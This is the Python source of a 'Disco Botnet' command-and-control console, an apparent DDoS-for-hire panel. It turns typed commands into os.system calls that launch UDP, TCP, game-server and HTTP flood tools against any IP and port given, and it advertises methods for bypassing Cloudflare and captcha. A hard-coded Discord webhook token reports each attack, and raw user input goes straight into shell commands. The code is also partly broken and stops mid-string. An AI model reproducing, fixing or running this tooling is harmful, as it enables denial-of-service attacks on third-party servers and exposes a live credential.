import socket
from datetime import datetime
import os
import curses
import requests
import random
from pystyle import Colors, Colorate, Center
from asciimatics.effects import BannerText, Print, Scroll
from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
from asciimatics.scene import Scene
from asciimatics.screen import Screen
from asciimatics.exceptions import ResizeScreenError, StopApplication
import getpass
import time
from time import sleep
import sys
users_file = "users.txt"
MAX_ATTEMPTS = 3
uname=input("Enter Custom Name:")
os.system("cls" if os.name == "nt" else "clear")
print(f"Welcome To Disco Bot net | Login Screen")
print("please wait.")
time.sleep(0.3)
os.system("cls" if os.name == "nt" else "clear")
print(f"Welcome To Disco Bot net | Login Screen")
print("please wait..")
time.sleep(0.3)
os.system("cls" if os.name == "nt" else "clear")
print(f"Welcome To Disco Bot net | Login Screen")
print("please wait...")
print("Slide onto our Botnet")
ip= requests.get('https://api.ipify.org').text.strip()
try:
    # Count lines in proxy.txt and assign to 'online'
    with open("proxy.txt", "r") as f:
        online = len(f.readlines())
except FileNotFoundError:
    print("Error: proxy.txt not found.")
    online = 0

def get_bot_count():
    try:
        with open("proxy.txt", "r") as f:
            bots = f.readlines()
        return len(bots)
    except FileNotFoundError:
        print("Error: proxy.txt not found.")
        return 0


current_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
###Help Gif###
def hlp(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "help.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=5),
    ]
    scenes.append(Scene(effects, 24))

    screen.play(scenes, stop_on_resize=False, repeat=False)
###Attack gif###
def atk(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "atk.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5, 
              speed=1),
    ]
    scenes.append(Scene(effects, 21))

    screen.play(scenes, stop_on_resize=False, repeat=False)
###Method gif###
def mthd(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "methods.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=0.5),
    ]
    scenes.append(Scene(effects, 20))

    screen.play(scenes, stop_on_resize=False, repeat=False)

    WEBHOOK_URL = "https://discord.com/api/webhooks/1304281179620507748/DQ_P7DMkdYTUnhEa35QMIpDUlQuxvAmZDkDGQ5clADPNLhCJ85O-dDKAkL313twV91Bg"

def send_attack_webhook(uname, url, port, time):
    embed = {
        "embeds": [
            {
                "title": f"{uname} sent a DDoS attack",
                "fields": [
                    {
                        "name": "Target:",
                        "value": f"> {url}",
                        "inline": True
                    },
                    {
                        "name": "Port:",
                        "value": f"> {port}",
                        "inline": True
                    },
                    {
                        "name": "Time:",
                        "value": f"> {time}",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": f"Sent On: {{current_date}}"
                },
                "color": 0xFF0000  # Red color for the embed
            }
        ]
    }
    WEBHOOK_URL = "https://discord.com/api/webhooks/1304281179620507748/DQ_P7DMkdYTUnhEa35QMIpDUlQuxvAmZDkDGQ5clADPNLhCJ85O-dDKAkL313twV91Bg"
    
    response = requests.post(WEBHOOK_URL, json=embed)
    if response.status_code == 204:
        print("Webhook sent successfully!")
    else:
        print(f"Failed to send webhook: {response.status_code}")

# Function to log when a user logs in
def log_user_login(uname):
    embed = {
        "title": "User Logged into CNC",
        "description": f"{uname} has logged into Disco Botnet",
        "color": 5814783  # Purple color for login
    }
    send_webhook(embed)

# Function to log when a command is used
def log_command_usage(uname):
    embed = {
        "title": "Command Ran on Disco",
        "description": f"{uname} ran a command on Disco. The command has already been sent out to them!",
        "color": 5814783  # Purple color for general commands
    }
    send_webhook(embed)

# Function to log when an attack command is used
def log_attack_command(uname, ip, port, time):
    embed = {
        "title": "Attack Command Ran",
        "description": f"{uname} ran an attack command",
        "color": 16711680,  # Red color for attack commands
        "fields": [
            {"name": "Target", "value": target, "inline": True},
            {"name": "Port", "value": port, "inline": True},
            {"name": "Time", "value": time, "inline": True}
        ]
    }
    send_webhook(embed)

    

###COPYRIGHT tool###
def si():
    print('       \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233m*  LIVE |  \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mDisco Botnet \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mL4/L4 Power \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233m')

###My ip####
def mip():
    print(f"""\x1b[0mYour IP Is \x1b[40;38;2;127;0;255m{ip}\x1b[0m""")
###Account###
def account():
    print(f"""\x1b[0mID: \x1b[38;2;255;0;255mUnknown\x1b[0m
\x1b[0mUsername: \x1b[38;2;255;0;255m{uname}
\x1b[0mBots: \x1b[38;2;255;0;255m{online}
\x1b[0mAdmin: true
\x1b[0mReseller: true
\x1b[0mVIP: true
\x1b[0mBypass Blacklist: true

\x1b[0mExpiry: \x1b[38;2;255;0;255m30\x1b[0m Day(s)
\x1b[0mMaxTime: \x1b[38;2;255;0;255m99999 \x1b[0mSeconds
\x1b[0mCooldown: \x1b[38;2;255;0;255m0\x1b[0m Seconds
\x1b[0mConcurrents: \x1b[38;2;255;0;255m1\x1b[0m
\x1b[0mMax Sessions: \x1b[38;2;255;0;255m4\x1b[0m
\x1b[0mMy Attacks Sent: \x1b[38;2;255;0;255mUnknow\x1b[0m
\x1b[0mCurrent IPv4: \x1b[38;2;255;0;255m{ip}\x1b[0m""")

###help###
def help():
    Screen.wrapper(hlp)
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""\x1b[38;2;255;0;255m         ╦  ╦\x1b[38;2;237;18;255m╦ ╦\x1b[38;2;219;36;255m╦╔╦╗\x1b[38;2;201;54;255m╔╗╔\x1b[38;2;183;72;255m╔═╗
         \x1b[38;2;255;0;255m╚╗╔╝\x1b[38;2;237;18;255m╠═╣\x1b[38;2;219;36;255m║║║║\x1b[38;2;201;54;255m║║║\x1b[38;2;183;72;255m╚═╗
          \x1b[38;2;255;0;255m╚╝ \x1b[38;2;237;18;255m╩ ╩\x1b[38;2;219;36;255m╩ ╩\x1b[38;2;201;54;255m╝╚╝\x1b[38;2;183;72;255m╚═╝
                      \x1b[38;2;255;0;255mDisco \x1b[38;2;115;255;248miu<3 \x1b[1;31mLapoo&.
           \x1b[38;2;255;0;255m \x1b[38;2;250;5;255m \x1b[38;2;245;10;255m╔\x1b[38;2;240;15;255m═\x1b[38;2;235;20;255m═\x1b[38;2;230;25;255m═\x1b[38;2;225;30;255m═\x1b[38;2;220;35;255m═\x1b[38;2;215;40;255m═\x1b[38;2;210;45;255m═\x1b[38;2;205;50;255m═\x1b[38;2;200;55;255m═\x1b[38;2;195;60;255m═\x1b[38;2;190;65;255m═\x1b[38;2;185;70;255m═\x1b[38;2;180;75;255m═\x1b[38;2;175;80;255m═\x1b[38;2;170;85;255m╦\x1b[38;2;165;90;255m═\x1b[38;2;160;95;255m═\x1b[38;2;155;100;255m═\x1b[38;2;150;105;255m═\x1b[38;2;145;110;255m═\x1b[38;2;140;115;255m═\x1b[38;2;135;120;255m═\x1b[38;2;130;125;255m═\x1b[38;2;125;130;255m═\x1b[38;2;120;135;255m═\x1b[38;2;115;140;255m═\x1b[38;2;110;145;255m═\x1b[38;2;105;150;255m═\x1b[38;2;100;155;255m═\x1b[38;2;95;160;255m═\x1b[38;2;90;165;255m═\x1b[38;2;85;170;255m═\x1b[38;2;80;175;255m═\x1b[38;2;75;180;255m═\x1b[38;2;70;185;255m═\x1b[38;2;65;190;255m═\x1b[38;2;60;195;255m═\x1b[38;2;55;200;255m═\x1b[38;2;50;205;255m═\x1b[38;2;45;210;255m═\x1b[38;2;40;215;255m═\x1b[38;2;35;220;255m═\x1b[38;2;30;225;255m═\x1b[38;2;25;230;255m╗\x1b[38;2;20;235;255m
           \x1b[38;2;255;0;255m╔\x1b[38;2;250;5;255m═\x1b[38;2;245;10;255m╣   \x1b[1;37mCOMMANDS   \x1b[38;2;170;85;255m║         \x1b[1;37mDESCRIPTION        \x1b[38;2;25;230;255m╠\x1b[38;2;20;235;255m═\x1b[38;2;15;240;255m╗\x1b[38;2;10;245;255m
           \x1b[38;2;255;0;255m║\x1b[1;37mH\x1b[38;2;245;10;255m╠\x1b[38;2;240;15;255m═\x1b[38;2;235;20;255m═\x1b[38;2;230;25;255m═\x1b[38;2;225;30;255m═\x1b[38;2;220;35;255m═\x1b[38;2;215;40;255m═\x1b[38;2;210;45;255m═\x1b[38;2;205;50;255m═\x1b[38;2;200;55;255m═\x1b[38;2;195;60;255m═\x1b[38;2;190;65;255m═\x1b[38;2;185;70;255m═\x1b[38;2;180;75;255m═\x1b[38;2;175;80;255m═\x1b[38;2;170;85;255m╬\x1b[38;2;165;90;255m═\x1b[38;2;160;95;255m═\x1b[38;2;155;100;255m═\x1b[38;2;150;105;255m═\x1b[38;2;145;110;255m═\x1b[38;2;140;115;255m═\x1b[38;2;135;120;255m═\x1b[38;2;130;125;255m═\x1b[38;2;125;130;255m═\x1b[38;2;120;135;255m═\x1b[38;2;115;140;255m═\x1b[38;2;110;145;255m═\x1b[38;2;105;150;255m═\x1b[38;2;100;155;255m═\x1b[38;2;95;160;255m═\x1b[38;2;90;165;255m═\x1b[38;2;85;170;255m═\x1b[38;2;80;175;255m═\x1b[38;2;75;180;255m═\x1b[38;2;70;185;255m═\x1b[38;2;65;190;255m═\x1b[38;2;60;195;255m═\x1b[38;2;55;200;255m═\x1b[38;2;50;205;255m═\x1b[38;2;45;210;255m═\x1b[38;2;40;215;255m═\x1b[38;2;35;220;255m═\x1b[38;2;30;225;255m═\x1b[38;2;25;230;255m╣\x1b[1;37mM\x1b[38;2;15;240;255m║
           \x1b[38;2;255;0;255m║\x1b[1;37mE\x1b[38;2;245;10;255m║ \x1b[1;37mMETHODS      \x1b[38;2;170;85;255m║ \x1b[1;32mAvailable Method Pages     \x1b[38;2;25;230;255m║\x1b[1;37mE\x1b[38;2;15;240;255m║
           \x1b[38;2;255;0;255m║\x1b[1;37mL\x1b[38;2;245;10;255m║ \x1b[1;37mACCOUNT      \x1b[38;2;170;85;255m║ \x1b[1;32mAccount Infomation         \x1b[38;2;25;230;255m║\x1b[1;37mN\x1b[38;2;15;240;255m║
           \x1b[38;2;255;0;255m║\x1b[1;37mP\x1b[38;2;245;10;255m║ \x1b[1;37mMYIP         \x1b[38;2;170;85;255m║ \x1b[1;32mShow Your IP               \x1b[38;2;25;230;255m║\x1b[1;37mU\x1b[38;2;15;240;255m║
           \x1b[38;2;255;0;255m╚\x1b[38;2;192;63;255m═\x1b[38;2;245;10;255m╣ \x1b[1;37mCLEAR        \x1b[38;2;170;85;255m║ \x1b[1;32mBack To Main Page          \x1b[38;2;25;230;255m╠\x1b[38;2;20;235;255m═\x1b[38;2;15;240;255m╝
           \x1b[38;2;255;0;255m \x1b[38;2;192;63;255m \x1b[38;2;245;10;255m║ \x1b[1;37mADMIN        \x1b[38;2;170;85;255m║ \x1b[1;32mAdmin Infomation           \x1b[38;2;25;230;255m║
           \x1b[38;2;255;0;255m \x1b[38;2;192;63;255m \x1b[38;2;245;10;255m║ \x1b[1;37mDISCORD      \x1b[38;2;170;85;255m║ \x1b[1;32mDiscord Server Link        \x1b[38;2;25;230;255m║
           \x1b[38;2;255;0;255m \x1b[38;2;250;5;255m \x1b[38;2;245;10;255m╚\x1b[38;2;240;15;255m═\x1b[38;2;235;20;255m═\x1b[38;2;230;25;255m═\x1b[38;2;225;30;255m═\x1b[38;2;220;35;255m═\x1b[38;2;215;40;255m═\x1b[38;2;210;45;255m═\x1b[38;2;205;50;255m═\x1b[38;2;200;55;255m═\x1b[38;2;195;60;255m═\x1b[38;2;190;65;255m═\x1b[38;2;185;70;255m═\x1b[38;2;180;75;255m═\x1b[38;2;175;80;255m═\x1b[38;2;170;85;255m╩\x1b[38;2;165;90;255m═\x1b[38;2;160;95;255m═\x1b[38;2;155;100;255m═\x1b[38;2;150;105;255m═\x1b[38;2;145;110;255m═\x1b[38;2;140;115;255m═\x1b[38;2;135;120;255m═\x1b[38;2;130;125;255m═\x1b[38;2;125;130;255m═\x1b[38;2;120;135;255m═\x1b[38;2;115;140;255m═\x1b[38;2;110;145;255m═\x1b[38;2;105;150;255m═\x1b[38;2;100;155;255m═\x1b[38;2;95;160;255m═\x1b[38;2;90;165;255m═\x1b[38;2;85;170;255m═\x1b[38;2;80;175;255m═\x1b[38;2;75;180;255m═\x1b[38;2;70;185;255m═\x1b[38;2;65;190;255m═\x1b[38;2;60;195;255m═\x1b[38;2;55;200;255m═\x1b[38;2;50;205;255m═\x1b[38;2;45;210;255m═\x1b[38;2;40;215;255m═\x1b[38;2;35;220;255m═\x1b[38;2;30;225;255m═\x1b[38;2;25;230;255m╝\x1b[0;00m
""")

def tools():
    os.system('cls' if os.name == 'nt' else 'clear')
    Screen.wrapper(mthd)
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')
####Methods####
def display_loading_message():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\n\nLoading Methods Page....")
    time.sleep(2)  # Simulate loading time

def show_methods_page():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
 * type "l7basic" to open Layer 7 Basic Page
 * type "l7vip" to open Layer 7 VIP page
""")

def show_layer_7_basic_page():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
[ Layer 7 Basic ]
-------------------
* "httpsbypass" ...... Custom flood that does high RQ/s & bypasses custom protection
* "httpsv2" .......... Flood made for bypassing Cloudflare/UAM with cookies & headers, bypasses custom js protection and others
* "tls" .......... Custom flood that does high RQ/s & bypasses custom protection
"browser" .......... Flood made for bypassing Cloudflare/UAM/Google Captcha with cookies
""")

def show_layer_7_vip_page():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
[ Layer 7 Vip ]
-------------------
* "https-cloudflare" ...... Custom flood that does high RQ/s & bypasses custom protection
* "tlsv2" .......... Flood made for bypassing Cloudflare/UAM with cookies & headers, bypasses custom js protection and others
""")

def meth():
    Screen.wrapper(mthd)
    os.system("cls" if os.name == "nt" else "clear")
    
    BORDER = "\033[96m"    # Cyan for borders
    HEADER = "\033[35m"    # Magenta for headers
    METHOD = "\033[36m"    # Cyan for method descriptions
    STATUS = "\033[92m"    # Green for online status
    OFFLINE = "\033[91m"   # Red for offline status
    BOLD = "\033[1m"       # Bold styling
    RESET = "\033[0m"      # Reset color

    # Method layout with box characters and color styling
    page_content = f"""
{BORDER}+------------------------------+-----------------------------------------------+{RESET}
{BORDER}|          {HEADER}{BOLD}Disco Networks{RESET}{BORDER}      |                   {HEADER}{BOLD}Methods                     {BORDER}|{RESET}
{BORDER}+------------------------------+-----------------------------------------------+{RESET}
{BORDER}|                              | {HEADER}{BOLD}Layer    Method           Target   Port Time{RESET}  |
{BORDER}| Network Status:              |------------------------------------------------|{RESET}
{BORDER}| {STATUS}{BOLD}L7 : Online{RESET}                  | {METHOD}[L7]     httpsbypass      <target> <port> (VIP){RESET}   |
{BORDER}|                              | {METHOD}[L7]     http-browser     <target> <port> (VIP){RESET}   |
{BORDER}|                              | {METHOD}[L7]     httpsv2          <target> <port> (VIP){RESET}   |
{BORDER}|                              | {METHOD}[L7]     http-xv          <target> <port> (VIP){RESET}   |
{BORDER}| {STATUS}{BOLD}L4 : Online{RESET}                  | {METHOD}[L4]     udpbypass        <target> <port> (VIP){RESET}   |
{BORDER}|                              | {METHOD}[L4]     tcpbypass        <target> <port> (VIP){RESET}   |
{BORDER}| {HEADER}{BOLD}Extra Sections:{RESET}              | {METHOD}[SPACE]  http-space       <target> <port> (SPACE){RESET} |
{BORDER}| XV SPACE                     | {METHOD}[SPACE]  kill-space       <target> <port> (SPACE){RESET} |
{BORDER}|                              | {METHOD}[SPACE]  crash-space      <target> <port> (SPACE){RESET} |
{BORDER}+------------------------------+-----------------------------------------------+{RESET}
{BORDER}| {BOLD}Telegram Channel{RESET}             | {OFFLINE}t.me/discobotnet{RESET}                                    |
{BORDER}| {BOLD}Discord Channel{RESET}              | {OFFLINE}DC.gg/discobotnet{RESET}                                   |
{BORDER}+------------------------------+-----------------------------------------------+{RESET}
"""

    print(page_content)

    


def menu():
    sys.stdout.write(f"\x1b]2;[-] | Disco Bot Net ̊ॱ User: {uname} ̊ॱ Running 0/10 ̊ॱ  Bots {online}\x07")
    os.system('cls' if os.name == 'nt' else 'clear')
    si()
    
    print(f"""
          \x1b[38;2;249;6;255m╚═\x1b[38;2;243;12;255m═══\x1b[38;2;237;18;255m═══\x1b[38;2;231;24;255m═\x1b[38;2;225;30;255m═\x1b[38;2;219;36;255m═\x1b[38;2;213;42;255m══════════════
          \x1b[38;2;255;0;255m╔══════════════════════════════════════════════╗
          \x1b[38;2;255;0;255m║           \x1b[38;2;239;239;239mWelcome to \x1b[38;2;255;0;0mDisco Botnet\x1b[38;2;239;239;239m           ║
          \x1b[38;2;255;0;255m║             \x1b[38;2;115;255;248mCreated by @lapooofym             ║
          \x1b[38;2;255;0;255m║        \033[1;4m\x1b[38;2;255;234;0m Made with ❤️ for Best L4/L7         \033[0m       ║
          \x1b[38;2;255;0;255m╚══════════════════════════════════════════════╝

                 \x1b[38;2;249;6;255m╔═══════════════════════════════════════════╗
                 \x1b[38;2;255;0;255m║ \x1b[38;2;239;239;239mType "[methods]" To See All Methods!    ║
                 \x1b[38;2;249;6;255m╚═══════════════════════════════════════════╝

                  \x1b[38;2;255;0;255m║ \x1b[38;2;0;113;133mDiscord:\x1b[38;2;239;239;239m [discord.gg/discobotnet]   ║

          \x1b[38;2;255;0;255m╔══════════════════════════════════════════════╗
          \x1b[38;2;255;0;255m║   \x1b[38;2;239;239;239mCopyright © 2024-2025 By \x1b[38;2;0;221;255mlapooofym    ║
          \x1b[38;2;255;0;255m╚══════════════════════════════════════════════╝
    """)

    


def main():
    menu()
    while(True):
        cnc = input(f"""
\x1b[38;2;239;239;239m┏━━[\x1b[38;2;255;99;71m{uname}\x1b[38;2;239;239;239m] - [\x1b[38;2;255;234;0mDisco Botnet\x1b[38;2;239;239;239m]
\x1b[38;2;239;239;239m┃
\x1b[38;2;239;239;239m┗━━➤ """)
        if cnc == "METHODS" or cnc == "methods" or cnc == "Methods":
            meth()
        elif cnc == "CLEAR" or cnc == "clear" or cnc == "cls":
            main()
        elif cnc == "adduser" or cnc == "user" or cnc == "add":
            admin()
        elif cnc == "ACCOUNT" or cnc == "Account" or cnc == "account":
            account()
        elif cnc == "HELP" or cnc == "Help" or cnc == "help":
            help()
        elif cnc =="DISCORD" or cnc == "Discord" or cnc == "discord":
            print("\x1b[38;2;0;255;255mhttps://discord.gg/UJRfjYE7Nn")
        elif cnc =="ADMIN" or cnc == "Admin" or cnc == "admin":
            admin()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        
        #####L4####
        elif "udp" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                os.system(f"python ./data/udp.py {ip} {port} 0 0")
            except IndexError:
                print("Usage : udp <ip> <port>")
                print("Example : udp 1.1.1.1 80")
        elif "tcp" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                method=cnc.split()[3]
                time=cnc.split()[4]
                conns=cnc.split()[5]
                os.system(f"./data/100UP-TCP {method} {ip} {port} {time} {conns}")
            except IndexError:
                print("Usage : tcp <ip> <port> <GET/POST/HEAD> <time> <connections>")
                print("Example : tcp 1.1.1.1 80 GET 60 9000")
        elif "udpbypass" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                os.system(f"./data/UDPBYPASS {ip} {port}")
            except IndexError:
                print("Usage : udpbypass <ip> <port>")
                print("Example : udpbypass 8.8.8.8 80")
        elif "std" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                os.system(f"./data/STD-NOSPOOF {ip} {port}")
            except IndexError:
                print("Usage : std <ip> <port>")
                print("Example : std 8.8.4.4 443")
        elif "std-v2" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                os.system(f"./data/std {ip} {port}")
            except IndexError:
                print("Usage : std-v2 <ip> <port>")
                print("Example : std-v2 1.1.1.1 80")
        elif "minecraft" in cnc:
            try:
                ip=cnc.split()[1]
                throttle=cnc.split()[2]
                threads=cnc.split()[3]
                time=cnc.split()[4]
                os.system(f"./data/MINECRAFT-SLAM {ip} {threads} {time}")
            except IndexError:
                print("Usage : minecraft <ip> <throttle> <threads> <time>")
                print("Example : minecraft 1.1.1.1 5000 500 60")
        elif "home" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                psize=cnc.split()[3]
                time=cnc.split()[4]
                os.system(f"perl ./data/home.pl {ip} {port} {psize} {time}")
            except IndexError:
                print("Usage : home <ip> <port> <packet_size> <time>")
                print("Example : home 1.1.1.1 80 65000 60")
        elif "samp" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                os.system(f"python3 ./data/samp.py {ip} {port}")
            except IndexError:
                print("Usage : samp <ip> <port>")
                print("Example : samp 1.1.1.1 7777")
        elif "ovh-amp" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                os.system(f"./data/OVH-AMP {ip} {port}")
            except IndexError:
                print("Usage : ovh-amp <ip> <port>")
                print("Example : ovh-amp 1.1.1.1 80")
        elif "nfo" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                threads=cnc.split()[3]
                time=cnc.split()[4]
                os.system(f"./data/nfo-killer {ip} {port} {threads} -1 {time}")
            except IndexError:
                print("Usage : nfo <ip> <port> <threads> <time>")
                print("Example : nfo 1.1.1.1 80 850 120")
        elif "fivem" in cnc:
                print("Methods [fivem] not Enable ...")
                
            #######L7######
        elif "http-raw" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                os.system(f"node ./data/HTTP-RAW.js {url} {time}")
                os.system('cls' if os.name == 'nt' else 'clear')
                send_attack_webhook(uname, url, port, time)
            except IndexError:
                print("Usage : http-raw <url> <port> <time>")
                print("Example : http-raw https://github.com/ 443 60")

           

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')  
        elif "touch-gorilla" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(atk)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(uname, url, port, time)
                print(f"""
                  \x1b[38;2;255;0;255m╔\x1b[38;2;237;18;255m═\x1b[38;2;231;24;255m╗\x1b[38;2;225;30;255m╔╦\x1b[38;2;219;36;255m╗\x1b[38;2;213;42;255m╔\x1b[38;2;207;48;255m╦╗\x1b[38;2;201;54;255m╔═\x1b[38;2;195;60;255m╗\x1b[38;2;189;66;255m╔═\x1b[38;2;183;72;255m╗\x1b[38;2;177;78;255m╦\x1b[38;2;171;84;255m╔\x1b[38;2;165;90;255m═  \x1b[38;2;159;96;255m╔\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m╗\x1b[38;2;141;114;255m╔\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m╗\x1b[38;2;123;132;255m╔\x1b[38;2;117;138;255m╗\x1b[38;2;111;144;255m╔\x1b[38;2;87;168;255m╔\x1b[38;2;81;174;255m╦\x1b[38;2;75;180;255m╗
                  \x1b[38;2;255;0;255m╠\x1b[38;2;237;18;255m═\x1b[38;2;231;24;255m╣ \x1b[38;2;225;30;255m║  \x1b[38;2;219;36;255m║ \x1b[38;2;213;42;255m╠═\x1b[38;2;207;48;255m╣\x1b[38;2;201;54;255m║  \x1b[38;2;195;60;255m╠\x1b[38;2;189;66;255m╩\x1b[38;2;183;72;255m╗ \x1b[38;2;177;78;255m ╚\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m╗\x1b[38;2;159;96;255m║\x1b[38;2;153;102;255m╣\x1b[38;2;147;108;255m ║\x1b[38;2;141;114;255m║\x1b[38;2;135;120;255m║\x1b[38;2;75;180;255m ║\x1b[38;2;75;180;255m║
                  \x1b[38;2;255;0;255m╩ \x1b[38;2;237;18;255m╩ \x1b[38;2;231;24;255m╩ \x1b[38;2;225;30;255m ╩ \x1b[38;2;219;36;255m╩ \x1b[38;2;213;42;255m╩\x1b[38;2;207;48;255m╚═\x1b[38;2;201;54;255m╝\x1b[38;2;195;60;255m╩ \x1b[38;2;189;66;255m╩  \x1b[38;2;183;72;255m╚\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m╝\x1b[38;2;165;90;255m╚\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m╝\x1b[38;2;147;108;255m╝\x1b[38;2;141;114;255m╚\x1b[38;2;135;120;255m╝\x1b[38;2;87;168;255m═\x1b[38;2;75;180;255m╩\x1b[38;2;75;180;255m╝
                \x1b[38;2;243;12;255m╚╦\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m╦\x1b[38;2;75;180;255m╝
           \x1b[38;2;243;12;255m╔═════╩\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m╩═\x1b[38;2;75;180;255m════╗
                   👾 \x1b[38;2;0;255;255m𝑨𝒕𝒕𝒂𝒄𝒌 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑺𝒆𝒏𝒅 👾
                   
                   \x1b[38;2;255;255;255mTARGET   : [{url}]
                   PORT     : [{port}]
                   DURATION : [{time}]
                   METHOD   : [touch-gorilla]
                   SENT BY  : [{uname}]
                   COOLDOWN : [0]
                   CONCS    : [1]
